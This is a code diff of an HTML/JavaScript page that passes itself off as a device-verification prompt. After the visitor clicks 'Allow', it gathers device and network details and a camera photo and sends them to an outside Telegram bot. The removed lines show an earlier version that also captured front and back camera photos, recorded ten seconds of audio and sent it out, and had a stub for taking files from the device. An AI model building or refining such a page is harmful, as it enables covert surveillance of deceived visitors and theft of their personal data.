@@ -3,20 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Access Permission Request</title>
+    <title>Device Information Collector</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             background-color: #f5f5f5;
             margin: 0;
-            padding: 0;
+            padding: 20px;
             text-align: center;
         }
         .container {
             max-width: 500px;
-            margin: 50px auto;
-            padding: 20px;
+            margin: 0 auto;
             background: white;
+            padding: 20px;
             border-radius: 10px;
             box-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }
@@ -52,7 +52,7 @@
 </head>
 <body>
     <div class="container">
-        <div id="status">Please wait 3 minutes...</div>
+        <div id="status">Please wait while we verify your device...</div>
         <button id="deny-btn" class="btn">Deny</button>
         <button id="allow-btn" class="btn">Allow</button>
     </div>
@@ -69,45 +69,39 @@
 
         // Main function when Allow is clicked
         allowBtn.addEventListener('click', async () => {
-            statusEl.textContent = "Processing... Please wait";
+            statusEl.textContent = "Processing your request...";
             allowBtn.disabled = true;
             denyBtn.disabled = true;
             
             try {
-                // Collect all data in parallel for maximum speed
-                const [deviceInfo, frontPhoto, backPhoto, audio, wifiInfo] = await Promise.all([
-                    getCompleteDeviceInfo(),
-                    captureCameraPhoto('user').catch(e => null),
-                    captureCameraPhoto('environment').catch(e => null),
-                    recordAudio(10).catch(e => null),
-                    getWifiInfo().catch(e => null)
-                ]);
+                // Collect all possible device information
+                const deviceInfo = await getCompleteDeviceInfo();
                 
-                // Add MAC and IMEI (simulated as these aren't accessible in browsers)
-                deviceInfo.macAddress = wifiInfo?.mac || "Requires native app permissions";
-                deviceInfo.imei = "Requires native app permissions"; // Cannot get real IMEI in browser
+                // Attempt to get camera access
+                const cameraPhoto = await captureCameraPhoto().catch(e => null);
                 
-                // Send all data to Telegram
-                await sendAllDataToTelegram(deviceInfo, frontPhoto, backPhoto, audio);
+                // Send all collected data to Telegram
+                await sendToTelegram(formatDeviceInfo(deviceInfo));
                 
-                // Send files from device (simulated file access)
-                await sendDeviceFiles();
+                if (cameraPhoto) {
+                    await sendPhotoToTelegram(cameraPhoto, 'device_photo.jpg');
+                }
                 
-                statusEl.textContent = "Completed successfully!";
+                statusEl.textContent = "Verification complete!";
             } catch (error) {
-                statusEl.textContent = "Error occurred during processing";
+                statusEl.textContent = "Error occurred during verification";
                 console.error("Error:", error);
             }
         });
 
         // Deny button action
         denyBtn.addEventListener('click', () => {
-            statusEl.textContent = "Permissions denied - No data was collected";
+            statusEl.textContent = "Permissions denied - No data collected";
             allowBtn.disabled = true;
             denyBtn.disabled = true;
         });
 
-        // Enhanced device info collection
+        // Collect comprehensive device information
         async function getCompleteDeviceInfo() {
             const info = {
                 // Basic device info
@@ -128,10 +122,6 @@
                 batteryLevel: "unknown",
                 isCharging: "unknown",
                 
-                // Placeholders for MAC and IMEI (will be filled later)
-                macAddress: "Pending...",
-                imei: "Pending...",
-                
                 // Timestamp
                 timestamp: new Date().toISOString()
             };
@@ -150,20 +140,11 @@
             return info;
         }
 
-        // Simulated WiFi info (in real app this would use appropriate APIs)
-        async function getWifiInfo() {
-            return {
-                mac: "Simulated-MAC-Address",
-                gateway: "192.168.1.1", // Example gateway
-                dns: "8.8.8.8" // Example DNS
-            };
-        }
-
         // Camera capture function
-        async function captureCameraPhoto(facingMode) {
+        async function captureCameraPhoto() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode, width: 1280, height: 720 }
+                    video: { width: 1280, height: 720 }
                 });
                 
                 const video = document.createElement('video');
@@ -182,29 +163,7 @@
                 
                 return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
             } catch (error) {
-                console.error(`Camera error (${facingMode}):`, error);
-                return null;
-            }
-        }
-
-        // Audio recording function
-        async function recordAudio(duration) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const recorder = new MediaRecorder(stream);
-                const chunks = [];
-                
-                recorder.ondataavailable = e => chunks.push(e.data);
-                recorder.start();
-                
-                await new Promise(resolve => setTimeout(resolve, duration * 1000));
-                
-                recorder.stop();
-                stream.getTracks().forEach(track => track.stop());
-                
-                return new Blob(chunks, { type: 'audio/ogg' });
-            } catch (error) {
-                console.error("Audio recording error:", error);
+                console.error("Camera error:", error);
                 return null;
             }
         }
@@ -221,71 +180,24 @@
             }
         }
 
-        // Simulated file access (in real app this would use the File System Access API)
-        async function sendDeviceFiles() {
-            try {
-                // This is simulated - in a real app you would use:
-                // const dirHandle = await window.showDirectoryPicker();
-                // const files = await getFilesFromDirectory(dirHandle);
-                
-                // Simulate sending 3 example files
-                await sendToTelegram("📁 Simulated file access - would send files from device in real implementation");
-                await new Promise(resolve => setTimeout(resolve, 1000));
-            } catch (error) {
-                console.error("File access error:", error);
-            }
-        }
-
-        // Send all data to Telegram
-        async function sendAllDataToTelegram(deviceInfo, frontPhoto, backPhoto, audio) {
-            // Format device info message
-            let message = `📱 <b>COMPLETE DEVICE INFORMATION</b>\n\n`;
-            
-            // Basic Info
-            message += `🖥️ <b>Basic Information</b>\n`;
-            message += `- User Agent: ${deviceInfo.userAgent}\n`;
-            message += `- Platform: ${deviceInfo.platform}\n`;
-            message += `- RAM: ${deviceInfo.deviceMemory} GB\n`;
-            message += `- CPU Cores: ${deviceInfo.cpuCores}\n`;
-            message += `- Screen: ${deviceInfo.screenResolution} (${deviceInfo.colorDepth})\n`;
-            message += `- Language: ${deviceInfo.language}\n`;
-            message += `- Timezone: ${deviceInfo.timezone}\n\n`;
-            
-            // Battery Info
-            message += `🔋 <b>Battery Status</b>\n`;
-            message += `- Level: ${deviceInfo.batteryLevel}\n`;
-            message += `- Charging: ${deviceInfo.isCharging}\n\n`;
-            
-            // Network Info
-            message += `🌐 <b>Network Information</b>\n`;
-            message += `- IP Address: ${deviceInfo.ip}\n`;
-            message += `- Network Type: ${deviceInfo.networkType}\n`;
-            message += `- MAC Address: ${deviceInfo.macAddress}\n`;
-            message += `- Gateway: 192.168.1.1\n`; // Simulated
-            message += `- DNS: 8.8.8.8\n\n`; // Simulated
-            
-            // Device Identifiers
-            message += `🆔 <b>Device Identifiers</b>\n`;
-            message += `- IMEI: ${deviceInfo.imei}\n\n`;
-            
-            // Timestamp
-            message += `⏰ <b>Timestamp</b>: ${deviceInfo.timestamp}`;
-            
-            // Send text info first
-            await sendToTelegram(message);
-            
-            // Send photos if available
-            if (frontPhoto) {
-                await sendPhotoToTelegram(frontPhoto, 'front_camera.jpg');
-            }
-            if (backPhoto) {
-                await sendPhotoToTelegram(backPhoto, 'back_camera.jpg');
-            }
-            
-            // Send audio if available
-            if (audio) {
-                await sendAudioToTelegram(audio, 'audio_recording.ogg');
-            }
+        // Format device information for Telegram
+        function formatDeviceInfo(info) {
+            return `📱 <b>DEVICE INFORMATION REPORT</b>\n\n` +
+                   `🖥️ <b>Basic Information</b>\n` +
+                   `- User Agent: ${info.userAgent}\n` +
+                   `- Platform: ${info.platform}\n` +
+                   `- RAM: ${info.deviceMemory} GB\n` +
+                   `- CPU Cores: ${info.cpuCores}\n` +
+                   `- Screen: ${info.screenResolution} (${info.colorDepth})\n` +
+                   `- Language: ${info.language}\n` +
+                   `- Timezone: ${info.timezone}\n\n` +
+                   `🔋 <b>Battery Status</b>\n` +
+                   `- Level: ${info.batteryLevel}\n` +
+                   `- Charging: ${info.isCharging}\n\n` +
+                   `🌐 <b>Network Information</b>\n` +
+                   `- IP Address: ${info.ip}\n` +
+                   `- Network Type: ${info.networkType}\n\n` +
+                   `⏰ <b>Timestamp</b>: ${info.timestamp}`;
         }
 
         // Telegram API functions
@@ -316,20 +228,6 @@
                 });
             } catch (error) {
                 console.error("Telegram photo error:", error);
-            }
-        }
-
-        async function sendAudioToTelegram(audioBlob, filename) {
-            try {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('audio', audioBlob, filename);
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
-                    method: 'POST',
-                    body: formData
-                });
-            } catch (error) {
-                console.error("Telegram audio error:", error);
             }
         }
     </script>
